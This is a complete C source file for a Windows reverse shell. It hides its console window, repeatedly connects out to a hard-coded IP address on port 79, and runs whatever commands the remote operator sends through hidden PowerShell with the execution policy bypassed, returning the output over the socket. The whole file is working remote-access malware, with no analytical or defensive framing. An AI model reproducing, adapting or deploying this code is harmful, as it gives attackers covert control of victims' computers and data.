#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <conio.h>

#pragma comment(lib, "ws2_32.lib")


#define CYAN "\033[36m"      
#define YELLOW "\033[33m"    
#define MAGENTA "\033[35m"   
#define RESET "\033[0m"
#define BOLD "\033[1m"

#define MAX_HISTORY 100
#define MAX_CMD_LENGTH 4096


typedef struct {
    char commands[MAX_HISTORY][MAX_CMD_LENGTH];
    int count;
    int current;
} CommandHistory;

void InitHistory(CommandHistory* hist) {
    hist->count = 0;
    hist->current = -1;
}

void AddToHistory(CommandHistory* hist, const char* cmd) {
    if (hist->count < MAX_HISTORY) {
        strcpy(hist->commands[hist->count], cmd);
        hist->count++;
        hist->current = hist->count;
    }
}

void SendPrompt(SOCKET s) {
    char prompt[4096];
    char currentDir[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, currentDir);
    sprintf(prompt, "\n%s%s%s%s@shell>%s ", BOLD, CYAN, currentDir, YELLOW, RESET);
    send(s, prompt, strlen(prompt), 0);
}

void ClearScreen(SOCKET s) {
    char clear[] = "\033[2J\033[H";  
    send(s, clear, strlen(clear), 0);
    SendPrompt(s);
}

SOCKET CreateConnection() {
    SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(79);
    addr.sin_addr.s_addr = inet_addr("194.135.82.193");

    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        closesocket(s);
        return INVALID_SOCKET;
    }

    return s;
}

void ExecuteCommand(SOCKET s, const char* cmd) {
    SECURITY_ATTRIBUTES sa;
    HANDLE hReadPipe, hWritePipe;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    char cmdline[4096];
    DWORD bytesRead;
    char buffer[4096];

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return;
    }

    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;
    si.wShowWindow = SW_HIDE;


    if (strncmp(cmd, "cd ", 3) == 0) {
        char path[4096];
        strcpy(path, cmd + 3); 
        SetCurrentDirectory(path);
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return;
    }

    
    sprintf(cmdline, "powershell.exe -NoProfile -NonInteractive -NoLogo -ExecutionPolicy Bypass -Command \"%s\"", cmd);
    
    if (CreateProcess(NULL,
        cmdline,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi))
    {
        CloseHandle(hWritePipe);

        while (ReadFile(hReadPipe, buffer, sizeof(buffer)-1, &bytesRead, NULL) && bytesRead != 0)
        {
            buffer[bytesRead] = '\0';
            
            char* end = strchr(buffer, '\r');
            if (end) *end = '\0';
            end = strchr(buffer, '\n');
            if (end) *end = '\0';
            
            
            if (strlen(buffer) > 0) {
                send(s, buffer, strlen(buffer), 0);
                send(s, "\n", 1, 0);
            }
        }

        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    CloseHandle(hReadPipe);
}

void HandleShell(SOCKET s) {
    char buffer[4096];
    int recvResult;
    char command[MAX_CMD_LENGTH] = {0};
    int cmdLen = 0;
    CommandHistory history;
    InitHistory(&history);
    char arrowBuffer[3] = {0};
    int arrowIndex = 0;

    char welcome[] = "\n\033[1;36m[*] PowerShell Bağlantısı Kuruldu...\033[0m";
    send(s, welcome, strlen(welcome), 0);
    
    SendPrompt(s);

    while(1) {
        recvResult = recv(s, buffer, 1, 0);
        if(recvResult <= 0) break;

        
        if (buffer[0] == 0x1B) { 
            arrowBuffer[arrowIndex++] = buffer[0];
            if (arrowIndex == 1) continue;
            
            recvResult = recv(s, buffer, 1, 0);
            if (recvResult <= 0) break;
            arrowBuffer[arrowIndex++] = buffer[0];
            
            if (arrowIndex == 2) {
                recvResult = recv(s, buffer, 1, 0);
                if (recvResult <= 0) break;
                arrowBuffer[arrowIndex++] = buffer[0];
                
                if (arrowBuffer[1] == '[') {
                    switch (arrowBuffer[2]) {
                        case 'A': 
                            if (history.current > 0) {
                                history.current--;
                                strcpy(command, history.commands[history.current]);
                                cmdLen = strlen(command);
                                
                                send(s, "\r", 1, 0);
                                for (int i = 0; i < cmdLen; i++) {
                                    send(s, " ", 1, 0);
                                }
                                send(s, "\r", 1, 0);
                                send(s, command, cmdLen, 0);
                            }
                            break;
                        case 'B': 
                            if (history.current < history.count - 1) {
                                history.current++;
                                strcpy(command, history.commands[history.current]);
                                cmdLen = strlen(command);
                                
                                send(s, "\r", 1, 0);
                                for (int i = 0; i < cmdLen; i++) {
                                    send(s, " ", 1, 0);
                                }
                                send(s, "\r", 1, 0);
                                send(s, command, cmdLen, 0);
                            }
                            break;
                    }
                }
                arrowIndex = 0;
                continue;
            }
        }

        if(buffer[0] == '\n' || buffer[0] == '\r') {
            if(cmdLen > 0) {
                command[cmdLen] = '\0';
                
                if(strcmp(command, "clear") == 0 || strcmp(command, "cls") == 0) {
                    char clearScreen[] = "\033[2J\033[H";
                    send(s, clearScreen, strlen(clearScreen), 0);
                } else if(strcmp(command, "exit") == 0) {
                    break;
                } else {
                    AddToHistory(&history, command);
                    ExecuteCommand(s, command);
                }
                
                cmdLen = 0;
                SendPrompt(s);
            }
        } else {
            if(cmdLen < sizeof(command)-1) {
                command[cmdLen++] = buffer[0];
            }
        }
    }
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        return 1;
    }

    int retryCount = 0;
    const int MAX_RETRY = 5;
    const int RETRY_DELAY = 5000; 

    while(1) {
        SOCKET s = CreateConnection();
        if(s != INVALID_SOCKET) {
            retryCount = 0; 
            HandleShell(s);
            closesocket(s);
        } else {
            retryCount++;
            if(retryCount >= MAX_RETRY) {
                Sleep(RETRY_DELAY); 
                retryCount = 0;
            } else {
                Sleep(1000); 
            }
        }
    }

    WSACleanup();
    return 0;
}
